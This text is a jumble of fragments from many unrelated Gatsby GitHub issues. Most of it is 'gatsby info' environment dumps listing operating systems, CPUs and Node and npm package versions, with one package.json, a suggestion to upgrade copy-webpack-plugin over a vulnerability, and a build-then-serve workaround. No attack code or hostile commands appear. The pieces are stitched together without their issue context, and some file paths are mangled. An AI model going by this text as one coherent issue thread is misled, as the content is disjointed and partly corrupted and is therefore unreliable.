"dependencies": { "@fortawesome/fontawesome": "^1.1.8", "@fortawesome/fontawesome-svg-core": "^1.2.30", "@fortawesome/free-solid-svg-icons": "^5.14.0", "@fortawesome/react-fontawesome": "^0.1.11", "bootstrap": "^4.5.2", "core-util-is": "^1.0.2", "font-awesome": "^4.7.0", "fontawesome": "^5.6.3", "gatsby": "^2.24.47", "gatsby-cli": "^2.12.87", "gatsby-source-notionso": "^1.1.6", "react": "^16.13.1", "react-addons-css-transition-group": "^15.6.2", "react-dom": "^16.13.1", "react-goodreads": "^1.0.8", "react-router-dom": "^5.2.0", "react-scripts": "3.0.1", "reactstrap": "^8.5.1" }
system: os: windows 8.1 6.3.9600 cpu: (4) x64 intel(r) core(tm) i7-3537u cpu @ 2.00ghz binaries: node: 12.16.1 - c:\\program files\ odejs\ ode.exe npm: 6.14.5 - c:\\program files\ odejs\ pm.cmd languages: python: 3.6.1 - c:\\users\\depa\\appdata\\local\\programs\\python\\python36-32\\python.exe browsers: chrome: 84.0.4147.135 npmpackages: gatsby: ^2.24.47 => 2.24.47 gatsby-image: ^2.4.16 => 2.4.16 gatsby-plugin-manifest: ^2.4.23 => 2.4.23 gatsby-plugin-netlify-cms: ^4.3.11 => 4.3.11 gatsby-plugin-offline: ^2.2.10 => 2.2.10 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-react-svg: ^2.1.2 => 2.1.2 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-sharp: ^2.6.27 => 2.6.27 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-json: ^2.4.11 => 2.4.11 gatsby-transformer-sharp: ^2.5.13 => 2.5.13 npmglobalpackages: gatsby-cli: 2.12.87 ## suggestion i have seen that the vulnerability comes from **copy-webpack-plugin** and should be fixed in version 6, what about updating? i can make a pr if needed, the upgrade step from version 5 should be easy as in this case it's just changing the constructor's argument from array to object.
i'm not sure this is very relevant to this specific issue, but here we go
``` system: os: linux 5.7 debian gnu/linux bullseye/sid cpu: (12) x64 intel(r) xeon(r) cpu d-1531 @ 2.20ghz shell: 5.0.18 - /bin/bash binaries: node: 12.18.3 - /usr/bin/node npm: 6.14.7 - /usr/bin/npm languages: python: 2.7.18 - /usr/bin/python npmpackages: gatsby: ^2.24.47 => 2.24.47 gatsby-image: ^2.4.16 => 2.4.16 gatsby-plugin-asset-path: ^3.0.2 => 3.0.2 gatsby-plugin-manifest: ^2.4.23 => 2.4.23 gatsby-plugin-offline: ^3.2.23 => 3.2.23 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-resolve-src: ^2.1.0 => 2.1.0 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-scroll-reveal: 0.0.7 => 0.0.7 gatsby-plugin-sharp: ^2.6.27 => 2.6.27 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-sharp: ^2.5.13 => 2.5.13 npmglobalpackages: gatsby-cli: 2.12.87
environment info from codesandbox reproduction: system: os: linux 5.4 debian gnu/linux 10 (buster) 10 (buster) cpu: (16) x64 intel(r) core(tm) i9-9900k cpu @ 3.60ghz shell: 5.0.3 - /bin/bash binaries: node: 10.21.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python npmpackages: gatsby: 2.24.47 => 2.24.47 gatsby-image: ^2.4.16 => 2.4.16 gatsby-plugin-manifest: ^2.4.23 => 2.4.23 gatsby-plugin-mdx: 1.2.34 => 1.2.34 gatsby-plugin-offline: ^3.2.23 => 3.2.23 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.27 => 2.6.27 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-sharp: ^2.5.13 => 2.5.13
note my environments are wsl 2 on windows 10
easily reproduced in [this repo]( just edit the page query in `src/pages/index.js` and note you'll need to save twice to get the page query to re-run
``` system: os: linux 4.19 debian gnu/linux 9 (stretch) 9 (stretch) cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 4.4.12 - /bin/bash binaries: node: 12.18.3 - /usr/local/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.6 - /usr/local/bin/npm languages: python: 2.7.13 - /usr/bin/python npmpackages: gatsby: ^2.24.47 => 2.24.47 gatsby-source-sanity: ^6.0.4 => 6.0.4
``` and ``` system: os: linux 4.19 ubuntu 18.04.1 lts (bionic beaver) cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 4.4.19 - /bin/bash binaries: node: 11.6.0 - /usr/bin/node npm: 6.14.8 - /usr/bin/npm languages: python: 2.7.15 - /usr/bin/python npmpackages: gatsby: ^2.24.47 => 2.24.47 gatsby-source-sanity: ^6.0.3 => 6.0.3 npmglobalpackages: gatsby-cli: 2.4.11
(if relevant) system: os: linux 4.19 ubuntu 18.04.4 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i5-6300u cpu @ 2.40ghz shell: 4.4.20 - /bin/bash binaries: node: 10.22.0 - ~/.local/nvm/versions/node/v10.22.0/bin/node yarn: 1.7.0 - /mnt/c/program files (x86)/yarn/bin/yarn npm: 6.14.6 - ~/.local/nvm/versions/node/v10.22.0/bin/npm languages: python: 2.7.17 - /usr/bin/python npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-remark: ^2.8.28 => 2.8.28 npmglobalpackages: gatsby-cli: 2.12.68
running in a free dyno on heroku ``` npmpackages: gatsby: ^2.24.42 => 2.24.47 ```
system: os: linux 5.4 ubuntu 20.04 lts (focal fossa) cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz shell: 5.0.16 - /bin/bash binaries: node: 10.19.0 - /usr/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.14.5 - /usr/local/bin/npm browsers: chrome: 84.0.4147.125 firefox: 76.0.1 npmpackages: gatsby: ^2.21.0 => 2.24.47 gatsby-cli: ^2.12.87 => 2.12.87 gatsby-image: ^2.4.0 => 2.4.16 gatsby-plugin-manifest: ^2.4.0 => 2.4.23 gatsby-plugin-offline: ^3.2.0 => 3.2.23 gatsby-plugin-react-helmet: ^3.3.0 => 3.3.10 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-sharp: ^2.6.0 => 2.6.27 gatsby-source-airtable: ^2.1.1 => 2.1.1 gatsby-source-filesystem: ^2.3.0 => 2.3.24 gatsby-source-graphql: ^2.6.2 => 2.7.1 gatsby-transformer-sharp: ^2.5.0 => 2.5.13 npmglobalpackages: gatsby-cli: 2.12.26 ## my package.json:
{ "name": "name", "private": true, "description": "desc", "version": "0.1.0", "author": "javier <mail>", "dependencies": { "@apollo/client": "^3.0.2", "@material-ui/core": "^4.11.0", "@material-ui/icons": "^4.9.1", "@material-ui/lab": "^4.0.0-alpha.56", "@n8tb1t/use-scroll-position": "^1.0.43", "autosuggest-highlight": "^3.1.1", "gatsby": "^2.21.0", "gatsby-cli": "^2.12.87", "gatsby-image": "^2.4.0", "gatsby-plugin-manifest": "^2.4.0", "gatsby-plugin-offline": "^3.2.0", "gatsby-plugin-react-helmet": "^3.3.0", "gatsby-plugin-sass": "^2.3.12", "gatsby-plugin-sharp": "^2.6.0", "gatsby-source-airtable": "^2.1.1", "gatsby-source-filesystem": "^2.3.0", "gatsby-source-graphql": "^2.6.2", "gatsby-transformer-sharp": "^2.5.0", "node-sass": "^4.14.1", "prop-types": "^15.7.2", "react": "^16.13.1", "react-dom": "^16.12.0", "react-helmet": "^6.0.0" }, "devdependencies": { "env-cmd": "^10.1.0", "eslint-config-prettier": "^6.11.0", "eslint-plugin-prettier": "^3.1.4", "prettier": "2.0.5" }, "keywords": [ "gatsby" ], "license": "mit", "scripts": { "build": "gatsby build", "local-build": "gatsby clean && env-cmd -f .env gatsby build", "develop": "env-cmd -f .env gatsby develop -h 0.0.0.0 -p 5000", "sstart": "env-cmd -f .env gatsby develop -p 5000 --https -c ./.certs/server.crt -k ./.certs/server.key", "format": "prettier --write \\"**/*.{js,jsx,json,md}\\"", "start": "yarn develop", "serve": "gatsby serve", "clean": "gatsby clean", }, "repository": { "type": "git", "url": " " }, "bugs": { "url": " " }
``` system: os: macos 10.15.6 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.18.2 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.125 safari: 13.1.2 npmpackages: gatsby: ^2.23.12 => 2.24.47 gatsby-image: ^2.4.16 => 2.4.16 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sass: ^2.3.10 => 2.3.12 gatsby-plugin-sharp: ^2.6.27 => 2.6.27 gatsby-source-contentful: ^2.3.26 => 2.3.37 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-sharp: ^2.5.13 => 2.5.13 gatsby-transformer-sqip: ^2.3.27 => 2.3.27 npmglobalpackages: gatsby-cli: 2.12.45
- on github issues
``` system: os: macos 10.15.5 cpu: (4) x64 intel(r) core(tm) i7-7567u cpu @ 3.50ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.16 - ~/.pyenv/shims/python browsers: chrome: 84.0.4147.125 firefox: 79.0 safari: 13.1.1 npmpackages: gatsby: ^2.24.11 => 2.24.11 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-image: ^2.4.13 => 2.4.13 gatsby-plugin-google-tagmanager: ^2.3.1 => 2.3.1 gatsby-plugin-manifest: ^2.4.21 => 2.4.21 gatsby-plugin-mdx: ^1.2.18 => 1.2.18 gatsby-plugin-nprogress: ^2.3.6 => 2.3.6 gatsby-plugin-offline: ^3.2.21 => 3.2.21 gatsby-plugin-react-helmet: ^3.2.1 => 3.2.1 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-sharp: ^2.6.22 => 2.6.22 gatsby-plugin-sitemap: ^2.3.6 => 2.3.6 gatsby-plugin-styled-components: ^3.3.10 => 3.3.10 gatsby-plugin-typescript: ^2.1.27 => 2.1.27 gatsby-source-filesystem: ^2.3.23 => 2.3.23 gatsby-source-sylius-rest: 0.3.0-dev.0 => 0.4.0-dev.1 gatsby-transformer-json: ^2.4.11 => 2.4.11 gatsby-transformer-sharp: ^2.5.11 => 2.5.11 ```
``` system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 5.3 - /bin/zsh binaries: node: 12.16.3 - ~/.nvm/versions/node/v12.16.3/bin/node yarn: 1.22.4 - ~/.nvm/versions/node/v12.16.3/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.3/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 84.0.4147.125 firefox: 80.0 safari: 13.1.2 npmpackages: gatsby: ^2.23.12 => 2.24.47 gatsby-source-filesystem: ^2.1.41 => 2.3.24 gatsby-theme-minimal: #gatsby-theme-minimal-v1.0.0-gitpkg => 1.0.0 npmglobalpackages: gatsby-cli: 2.12.29
on gatsbyjs.com ## related issues - updates from #26106 `add refresh content docs` - same error: #26460 `unified gatsby: sidebar content is not updated, redirects are not applied, old content still cached`
system: os: macos 10.15.6 cpu: (8) x64 intel(r) core(tm) i7-1068ng7 cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.8.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.7 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.125 safari: 13.1.2 npmpackages: gatsby: ^2.24.12 => 2.24.12 gatsby-plugin-layout: ^1.3.10 => 1.3.10 gatsby-plugin-mdx: ^1.2.30 => 1.2.30 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.23 => 2.6.23 gatsby-plugin-sitemap: ^2.4.11 => 2.4.11 gatsby-remark-autolink-headers: ^2.3.11 => 2.3.11 gatsby-remark-copy-linked-files: ^2.3.12 => 2.3.12 gatsby-remark-embed-snippet: ^4.3.14 => 4.3.14 gatsby-remark-images: ^3.3.22 => 3.3.22 gatsby-source-filesystem: ^2.3.23 => 2.3.23
os: macos 10.15.5
cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz
shell: 5.7.1 - /bin/zsh
node: 14.5.0 - /usr/local/bin/node
npm: 6.14.5 - /usr/local/bin/npm
python: 2.7.16 - /usr/bin/python
chrome: 84.0.4147.125
firefox: 78.0.2
safari: 13.1.1
npmpackages:
gatsby: ^2.24.2 => 2.24.2
gatsby-cli: ^2.12.87 => 2.12.87
gatsby-image: ^2.4.12 => 2.4.12
gatsby-plugin-anchor-links: ^1.1.1 => 1.1.1
gatsby-plugin-favicon: ^3.1.6 => 3.1.6
gatsby-plugin-offline: ^3.2.9 => 3.2.9
gatsby-plugin-react-helmet: ^3.3.4 => 3.3.4
gatsby-plugin-react-svg: ^3.0.0 => 3.0.0
gatsby-plugin-sass: ^2.3.4 => 2.3.4
gatsby-plugin-sharp: ^2.6.18 => 2.6.18
gatsby-plugin-smoothscroll: ^1.1.0 => 1.1.0
gatsby-plugin-snipcart: ^1.1.2 => 1.1.2
gatsby-plugin-snipcart-advanced: ^1.0.0 => 1.0.0
gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4
gatsby-remark-images: ^3.3.10 => 3.3.10
gatsby-source-filesystem: ^2.0.28 => 2.0.28
gatsby-source-strapi: 0.0.12 => 0.0.12
gatsby-source-stripe: ^3.1.1 => 3.1.1
gatsby-transformer-remark: ^2.8.17 => 2.8.17
gatsby-transformer-sharp: ^2.5.10 => 2.5.10
npmglobalpackages:
gatsby-cli: 2.5.9-ink.61 (i had to revert to `gatsby-cli: 2.5.9-ink.61` since `2.12.87` was giving me an error when i tried to run `gatsby info --clipboard`
i'm using `gatsby cli version: 2.12.87`)
``` system: os: linux 5.4 ubuntu 20.04.1 lts (focal fossa) cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz shell: 5.0.17 - /bin/bash binaries: node: 14.3.0 - ~/.nvm/versions/node/v14.3.0/bin/node yarn: 1.22.4 - ~/.nvm/versions/node/v14.3.0/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v14.3.0/bin/npm browsers: chrome: 84.0.4147.125 firefox: 79.0 npmpackages: gatsby: ^2.24.47 => 2.24.47 npmglobalpackages: gatsby-cli: 2.12.87 ```
system: os: linux 5.7 archlabs cpu: (4) x64 intel(r) core(tm) i5-4200u cpu @ 1.60ghz shell: 5.0.17 - /bin/bash binaries: node: 10.22.0 - ~/.nvm/versions/node/v10.22.0/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.6 - ~/.nvm/versions/node/v10.22.0/bin/npm languages: python: 3.8.5 - /usr/bin/python browsers: firefox: 79.0 npmpackages: gatsby: ^2.24.47 => 2.24.47 gatsby-theme-andy: ^0.2.1 => 0.2.1 npmglobalpackages: gatsby-cli: 2.12.87
``` system: os: macos 10.15.6 cpu: (6) x64 intel(r) core(tm) i5-8500b cpu @ 3.00ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.8.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.7 - /usr/local/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 84.0.4147.125 firefox: 79.0 safari: 13.1.2 npmpackages: gatsby: ^2.24.41 => 2.24.41 gatsby-image: ^2.4.15 => 2.4.15 gatsby-plugin-feed: ^2.5.11 => 2.5.11 gatsby-plugin-google-analytics: ^2.3.13 => 2.3.13 gatsby-plugin-manifest: ^2.4.22 => 2.4.22 gatsby-plugin-offline: ^3.2.23 => 3.2.23 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.26 => 2.6.26 gatsby-plugin-typography: ^2.5.10 => 2.5.10 gatsby-remark-copy-linked-files: ^2.3.12 => 2.3.12 gatsby-remark-images: ^3.3.25 => 3.3.25 gatsby-remark-prismjs: ^3.5.10 => 3.5.10 gatsby-remark-responsive-iframe: ^2.4.12 => 2.4.12 gatsby-remark-smartypants: ^2.3.10 => 2.3.10 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-remark: ^2.8.28 => 2.8.28 gatsby-transformer-sharp: ^2.5.12 => 2.5.12 npmglobalpackages: gatsby-cli: 2.12.66
``` system: os: macos 10.15.6 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.4.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.6 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.125 safari: 13.1.2 npmpackages: gatsby: ^2.24.42 => 2.24.42 gatsby-alias-imports: ^1.0.4 => 1.0.4 gatsby-image: ^2.4.15 => 2.4.15 gatsby-plugin-google-tagmanager: ^2.3.11 => 2.3.11 gatsby-plugin-manifest: ^2.4.22 => 2.4.22 gatsby-plugin-offline: ^3.2.23 => 3.2.23 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-sharp: ^2.6.26 => 2.6.26 gatsby-plugin-svgr-svgo: ^1.0.12 => 1.0.12 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-source-wordpress-experimental: ^1.3.3 => 1.3.3 gatsby-transformer-sharp: ^2.5.12 => 2.5.12
v12.18.3 $ npm -v
6.14.6 $ sw_vers
productname: mac os x
productversion: 10.15.6
buildversion: 19g2021
system: os: macos 10.15.3 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.18.1 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.125 safari: 13.0.5 npmpackages: gatsby: ^2.24.41 => 2.24.41 gatsby-plugin-typography: ^2.5.10 => 2.5.10 npmglobalpackages: gatsby-cli: 2.12.87
``` system: os: windows 10 10.0.19*** cpu: (12) x64 intel(r) core(tm) i7-****** cpu @ 3.70ghz binaries: node: 14.7.0 - ~\\appdata\\local\\temp\\ccc\ ode.cmd yarn: 1.22.4 - ~\\appdata\\local\\temp\\ccc\\yarn.cmd npm: 6.14.7 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.5 browsers: chrome: 84.0.4147.*** edge: spartan (44.19041.***.0) npmpackages: gatsby: ^2.21.9 => 2.24.26 gatsby-image: ^2.4.0 => 2.4.14 gatsby-plugin-catch-links: ^2.0.9 => 2.3.11 gatsby-plugin-emotion: ^3.0.1 => 3.0.1 gatsby-plugin-layout: ^1.3.0 => 1.3.10 gatsby-plugin-manifest: ^2.0.12 => 2.4.21 gatsby-plugin-material-ui: ^2.1.8 => 2.1.10 gatsby-plugin-react-helmet: ^3.0.0 => 3.3.10 gatsby-plugin-s3: ^0.3.4 => 0.3.4 gatsby-plugin-sharp: ^2.0.15 => 2.6.24 gatsby-plugin-sitemap: ^2.0.3 => 2.4.11 gatsby-plugin-typescript: ^2.0.3 => 2.4.16 gatsby-plugin-webpack-bundle-analyser-v2: ^1.1.9 => 1.1.11 gatsby-remark-component: ^1.1.3 => 1.1.3 gatsby-remark-images: ^3.0.1 => 3.3.24 gatsby-source-filesystem: ^2.3.23 => 2.3.23 gatsby-transformer-remark: ^2.1.15 => 2.8.27 gatsby-transformer-sharp: ^2.1.9 => 2.5.12 done in 2.53s
development environment
### workaround the only workaround i've found so far is:
1) **gatsby build**
2) **gatsby serve** then it's working as expected
thanks! ## awesome framework by the way! ##
``` system: os: linux 4.19 ubuntu 18.04.5 lts (bionic beaver) cpu: (8) x64 amd fx(tm)-8320 eight-core processor shell: 3.1.2 - /usr/bin/fish binaries: node: 14.8.0 - /usr/bin/node npm: 6.14.7 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 84.0.4147.125 firefox: 79.0 npmpackages: gatsby: ^2.24.41 => 2.24.47 gatsby-image: ^2.4.15 => 2.4.16 gatsby-plugin-manifest: ^2.4.22 => 2.4.23 gatsby-plugin-offline: ^3.2.23 => 3.2.23 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.26 => 2.6.27 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-sharp: ^2.5.12 => 2.5.13 npmglobalpackages: gatsby-cli: 2.12.87
system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.5.0 - /usr/local/bin/node npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.125 firefox: 78.0.2 safari: 13.1.1 npmpackages: gatsby: ^2.24.2 => 2.24.2 gatsby-cli: ^2.12.87 => 2.12.87 gatsby-image: ^2.4.12 => 2.4.12 gatsby-plugin-anchor-links: ^1.1.1 => 1.1.1 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 gatsby-plugin-offline: ^3.2.9 => 3.2.9 gatsby-plugin-react-helmet: ^3.3.4 => 3.3.4 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sass: ^2.3.4 => 2.3.4 gatsby-plugin-sharp: ^2.6.18 => 2.6.18 gatsby-plugin-smoothscroll: ^1.1.0 => 1.1.0 gatsby-plugin-snipcart: ^1.1.2 => 1.1.2 gatsby-plugin-snipcart-advanced: ^1.0.0 => 1.0.0 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-remark-images: ^3.3.10 => 3.3.10 gatsby-source-filesystem: ^2.0.28 => 2.0.28 gatsby-source-strapi: 0.0.12 => 0.0.12 gatsby-source-stripe: ^3.1.1 => 3.1.1 gatsby-transformer-remark: ^2.8.17 => 2.8.17 gatsby-transformer-sharp: ^2.5.10 => 2.5.10 npmglobalpackages: gatsby-cli: 2.5.9-ink.61 (i had to revert to `gatsby-cli: 2.5.9-ink.61` since `2.12.87` was giving me an error when i tried to run `gatsby info --clipboard`
i'm using `gatsby cli version: 2.12.87`) edit: reproducing the issue should now be easier
and hopefully my issue is now easier to understand
``` system: os: linux 5.4 linux mint 20 (ulyana) cpu: (8) x64 intel(r) core(tm) i7-9700k cpu @ 3.60ghz shell: 5.8 - /usr/bin/zsh binaries: node: 14.8.0 - ~/.nvm/versions/node/v14.8.0/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.7 - ~/.nvm/versions/node/v14.8.0/bin/npm browsers: chrome: 83.0.4103.116 firefox: 79.0 npmpackages: gatsby: ^2.24.47 => 2.24.47 gatsby-background-image: ^1.1.2 => 1.1.2 gatsby-image: ^2.4.16 => 2.4.16 gatsby-plugin-manifest: ^2.4.23 => 2.4.23 gatsby-plugin-offline: ^3.2.23 => 3.2.23 gatsby-plugin-react-helmet: 3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.27 => 2.6.27 gatsby-plugin-styled-components: ^3.3.10 => 3.3.10 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-sharp: ^2.5.13 => 2.5.13
``` i also tested it with node v12.18.0 with sadly the same result.
and i of course know `gbi` is no core component of gatsby, but any help would be greatly appreciated!
```sh system: os: macos 10.15.6 cpu: (4) x64 intel(r) core(tm) i5-7267u cpu @ 3.10ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.15.0 - /usr/local/bin/node yarn: 1.21.1 - ~/.yarn/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.125 firefox: 79.0 safari: 13.1.2 npmpackages: gatsby: ^2.24.41 => 2.24.41 gatsby-image: ^2.4.15 => 2.4.15 gatsby-plugin-manifest: ^2.4.22 => 2.4.22 gatsby-plugin-offline: ^3.2.23 => 3.2.23 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.26 => 2.6.26 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-sharp: ^2.5.12 => 2.5.12 ```
tested on safari & firefox
<img width="1440" alt="screenshot 2020-08-15 at 9 30 35 pm" src=" "> ### additional notes
would love to take this up if it isn't already being fixed.
``` system: os: linux 5.8 arch linux cpu: (8) x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz shell: 5.8 - /usr/bin/zsh binaries: node: 10.16.3 - ~/.nvm/versions/node/v10.16.3/bin/node yarn: 1.22.4 - ~/.nvm/versions/node/v10.16.3/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.3/bin/npm languages: python: 3.8.5 - /usr/bin/python browsers: firefox: 79.0 npmglobalpackages: gatsby-cli: 2.12.87
``` system: os: linux 5.4 ubuntu 20.04.1 lts (focal fossa) cpu: (8) x64 amd ryzen 7 3700u with radeon vega mobile gfx shell: 5.0.17 - /bin/bash binaries: node: 14.8.0 - /usr/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.7 - ~/.npm-global/bin/npm languages: python: 2.7.18 - /usr/bin/python browsers: chrome: 84.0.4147.125 firefox: 79.0 npmpackages: gatsby: ^2.24.47 => 2.24.47 gatsby-image: ^2.4.16 => 2.4.16 gatsby-plugin-feed: ^2.5.11 => 2.5.11 gatsby-plugin-google-analytics: ^2.3.13 => 2.3.13 gatsby-plugin-manifest: ^2.4.23 => 2.4.23 gatsby-plugin-offline: ^3.2.23 => 3.2.23 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.27 => 2.6.27 gatsby-plugin-typography: ^2.5.10 => 2.5.10 gatsby-remark-copy-linked-files: ^2.3.12 => 2.3.12 gatsby-remark-images: ^3.3.25 => 3.3.25 gatsby-remark-prismjs: ^3.5.10 => 3.5.10 gatsby-remark-responsive-iframe: ^2.4.12 => 2.4.12 gatsby-remark-smartypants: ^2.3.10 => 2.3.10 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-remark: ^2.8.28 => 2.8.28 gatsby-transformer-sharp: ^2.5.13 => 2.5.13 npmglobalpackages: gatsby-cli: 2.12.87
both node and gatsby are latest version
gatsby cli vesion : 2.12.87
gatsby version: 2.24.41 node version: 12.18.3
on gatsbyjs.com ## related issues - #25503 `feat(docs): better docs for big chunk of schema stuff`
``` system: os: macos 10.15.6 cpu: (8) x64 intel(r) core(tm) i7-4770k cpu @ 3.50ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.7.0 - /usr/local/bin/node npm: 6.14.7 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.125 safari: 13.1.2 npmpackages: gatsby: ^2.24.26 => 2.24.47 gatsby-plugin-manifest: ^2.4.22 => 2.4.23 gatsby-plugin-mdx: ^1.2.34 => 1.2.34 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-slug: ^1.1.0 => 1.1.0 gatsby-remark-autolink-headers: ^2.3.11 => 2.3.11 gatsby-source-filesystem: ^2.3.24 => 2.3.24
system: os: macos 10.15.6 cpu: (16) x64 intel(r) xeon(r) w-2140b cpu @ 3.20ghz shell: 3.2.57 - /bin/bash binaries: node: 14.8.0 - /usr/local/bin/node npm: 6.14.7 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.125 safari: 13.1.2 npmpackages: gatsby: ^2.24.41 => 2.24.41 npmglobalpackages: gatsby-cli: 2.12.87
the environment is `node14-alpine` docker container inside a bitbucket pipeline.
``` system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 12.18.2 - ~/.nvm/versions/node/v12.18.2/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.14.7 - ~/.nvm/versions/node/v12.18.2/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.125 firefox: 79.0 safari: 13.1 npmpackages: gatsby: 2.24.47 => 2.24.47 gatsby-image: 2.4.16 => 2.4.16 gatsby-plugin-emotion: 4.3.10 => 4.3.10 gatsby-plugin-layout: 1.3.10 => 1.3.10 gatsby-plugin-manifest: 2.4.23 => 2.4.23 gatsby-plugin-mdx: 1.2.34 => 1.2.34 gatsby-plugin-offline: 3.2.23 => 3.2.23 gatsby-plugin-react-helmet-async: 1.0.16 => 1.0.16 gatsby-plugin-robots-txt: 1.5.1 => 1.5.1 gatsby-plugin-root-import: 2.0.5 => 2.0.5 gatsby-plugin-sharp: 2.6.27 => 2.6.27 gatsby-plugin-sitemap: 2.4.11 => 2.4.11 gatsby-source-filesystem: 2.3.24 => 2.3.24 gatsby-transformer-sharp: 2.5.13 => 2.5.13
